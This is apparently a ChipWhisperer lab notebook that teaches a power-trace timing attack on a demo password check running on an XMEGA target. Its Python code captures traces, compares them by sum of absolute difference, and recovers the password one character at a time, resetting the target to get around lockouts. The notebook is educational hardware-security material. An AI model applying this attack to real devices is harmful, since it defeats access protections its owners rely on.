{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Timing Analysis with Power for Password Bypass\n",
    "\n",
    "Supported setups:\n",
    "\n",
    "SCOPES:\n",
    "\n",
    "* OPENADC\n",
    "\n",
    "PLATFORMS:\n",
    "\n",
    "* CWLITEXMEGA"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Basic Setup"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "SCOPETYPE = 'OPENADC'\n",
    "PLATFORM = 'CWLITEXMEGA'\n",
    "CRYPTO_TARGET = 'NONE'"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "%run \"Helper_Scripts/Setup_Generic.ipynb\""
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Setup is the same as usual, except this time we'll be capturing 2000 traces."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "scope.adc.samples = 2000"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Helper Functions for Password Attack"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "As was mentioned at the beginning of the tutorial, the firmware we loaded onto the target implements a basic password check. After getting a `'\\n'` terminated password, the target checks it and enters an infinite loop, so before communicating with it, we'll need to reset it.\n",
    "\n",
    "We'll be doing this a lot, so we'll define a function that resets the target (this function is also available by running \"Helper_Scripts/Setup.ipynb\" as we did above):"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "from bokeh.plotting import figure, show \n",
    "from bokeh.io import output_notebook\n",
    "from bokeh.models import CrosshairTool\n",
    "from bokeh.models import Range1d\n",
    "\n",
    "output_notebook()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "import time\n",
    "def reset_target(scope):\n",
    "        scope.io.pdic = 'low'\n",
    "        time.sleep(0.05)\n",
    "        target.flush()\n",
    "        scope.io.pdic = 'high'\n",
    "        time.sleep(0.05)\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "def cap_pass_trace(pass_guess, fPrint = False):\n",
    "    ret = \"\"\n",
    "    reset_target(scope)\n",
    "    num_char = target.in_waiting()\n",
    "    while num_char > 0:\n",
    "        ret += target.read(num_char, 10)\n",
    "        time.sleep(0.01)\n",
    "        num_char = target.in_waiting()\n",
    "\n",
    "    if fPrint == True:\n",
    "        print(ret)\n",
    "    \n",
    "    scope.arm()\n",
    "    target.flush()\n",
    "    target.write(pass_guess)\n",
    "    ret = scope.capture()\n",
    "    if ret:\n",
    "        print('Timeout happened during acquisition')\n",
    "\n",
    "    trace = scope.get_last_trace()\n",
    "    \n",
    "    ret = \"\"\n",
    "    num_char = target.in_waiting()\n",
    "    while num_char > 0:\n",
    "        ret += target.read(num_char, 10)\n",
    "        time.sleep(0.01)\n",
    "        num_char = target.in_waiting()\n",
    "    \n",
    "    return trace, ret"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "**NOTE**\n",
    "The text may appear cutoff, accompanied by a message about data loss. This means that the buffer used to store serial data (128 bytes) from the target is full. This isn't an issue here, since the text is just aesthetic, but keep this in mind if you want to do large transfers of serial data using ChipWhisperer. "
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Timing Analysis"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Trace a Password attempt"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "def tracemult(psw):\n",
    "    outputbuf = \"\"\n",
    "    # h0px3\n",
    "    psw_good = psw + '\\n'\n",
    "    psw_false = psw[:-1] + '\\xff\\n'\n",
    "    \n",
    "    diff = [0] * 2000\n",
    "    for i in range(5):\n",
    "        print('.', end='')\n",
    "        trace, outputbuf = cap_pass_trace(psw_good, False)\n",
    "        trace2, outputbuf = cap_pass_trace(psw_false, False)\n",
    "\n",
    "        diff += abs(trace-trace2)\n",
    "    return diff"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "diff = tracemult('h')\n",
    "print('\\nStandard deviation: {}'.format(diff.std()))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "maxvalue = diff.max()\n",
    "maxindex = diff.argmax()\n",
    "meanvalue = diff.mean()\n",
    "percent = maxvalue / meanvalue *100.0\n",
    "print('Max value {:.6f} at position {}'.format(maxvalue, maxindex))\n",
    "print('Mean value of trace {:.6f} is {:.0f} Percent of max value'.format(meanvalue, percent))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "p = figure()\n",
    "p.y_range = Range1d(0, 0.8)\n",
    "p.add_tools(CrosshairTool())\n",
    "p.line(x_range, diff)\n",
    "#p.line(x_range, trace2, line_color='green')\n",
    "show(p)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Attacking a Single Letter"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "The plan for the attack: usa SAD (Sum of absolute difference) to find the correct letter. To do this, we'll create a loop that:\n",
    "\n",
    "* Figures out our next guess\n",
    "* Figures out a next false guess\n",
    "* Does the capture and records the traces\n",
    "* Calculate the SAD value $sad = \\sum_{}^{}abs(trace1 - trace2)$\n",
    "* Checks if the SAD value is in a proper range to know that the correct letter ist found\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "trylist = \"abcdefghijklmnopqrstuvwxyz0123456789\"\n",
    "password = \"\"\n",
    "outputbuf = \"\"\n",
    "\n",
    "# set false password\n",
    "next_pass_false = b'\\xff\\x0a'\n",
    "\n",
    "# trace false try\n",
    "trace_false, outputbuf = cap_pass_trace(next_pass_false)\n",
    "\n",
    "allMax = 0.0\n",
    "foundC = ''\n",
    "for c in trylist:\n",
    "    # set password\n",
    "    next_pass = password + c\n",
    "    # trace good and false several times\n",
    "    diff = tracemult(next_pass)\n",
    "    maxvalue = diff.max()\n",
    "    maxindex = diff.argmax()\n",
    "    meanvalue = diff.mean()\n",
    "    percent = maxvalue / meanvalue *100.0\n",
    "    #print('Character : ' + c)\n",
    "    #print('Char : {:s} Max value {:.6f} at position {}'.format(c, maxvalue, maxindex))\n",
    "    #print('Mean value of trace {:.6f} is {:.0f} Percent of max value'.format(meanvalue, percent))\n",
    "    \n",
    "    if allMax < maxvalue:\n",
    "        allMax = maxvalue\n",
    "        foundC = c\n",
    "print(\"Success: \" + foundC)\n",
    "        "
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Attacking the Full Password"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Now that we can guess a single character, attacking the rest is easy; we just need to repeat the process in another loop, move the check point (this is the change is location you recorded earlier), and update our guess with the new correct letter.\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "trylist = \"abcdefghijklmnopqrstuvwxyz0123456789\"\n",
    "password = \"\"\n",
    "outputbuf = \"\"\n",
    "for i in range(30):    \n",
    "    # set next false password\n",
    "    next_pass_false = password + ' ' + \"\\n\"\n",
    "    # trace false try\n",
    "    trace_false, outputbuf = cap_pass_trace(next_pass_false)\n",
    "\n",
    "    for c in trylist:\n",
    "        # set next password\n",
    "        next_pass = password + c + \"\\n\"\n",
    "        # trace both passwords\n",
    "        trace, outputbuf = cap_pass_trace(next_pass)\n",
    "        # calculate sad value\n",
    "        sad = abs(trace - trace_false).sum()\n",
    "        if sad > 50.0:\n",
    "            password += c\n",
    "            print(\"Success, pass now {}\".format(password))\n",
    "            break\n",
    "\n",
    "    if \"Welcome\" in outputbuf:\n",
    "        print('Password fully attacked : {}'.format(password))\n",
    "        break"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "That's it! You should have successfully cracked a password using the timing attack. Some notes on this method:\n",
    "\n",
    "* The current script doesn't look for the \"WELCOME\" message when the password is OK. That is an extension that allows it to crack any size password.\n",
    "* If there was a lock-out on a wrong password, the system would ignore it, as it resets the target after every attempt."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Tests"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "outputbuf = \"\"\n",
    "trace, outputbuf = cap_pass_trace(password + '\\n', True)\n",
    "print (outputbuf)\n",
    "if \"Welcome\" not in outputbuf:\n",
    "    print(\"Failed to break password, got {}.\\n\".format(password))\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Disconnect"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "scope.dis()\n",
    "target.dis()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.6.7"
  },
  "toc": {
   "base_numbering": 1,
   "nav_menu": {},
   "number_sections": true,
   "sideBar": true,
   "skip_h1_title": false,
   "title_cell": "Table of Contents",
   "title_sidebar": "Contents",
   "toc_cell": false,
   "toc_position": {},
   "toc_section_display": true,
   "toc_window_display": false
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
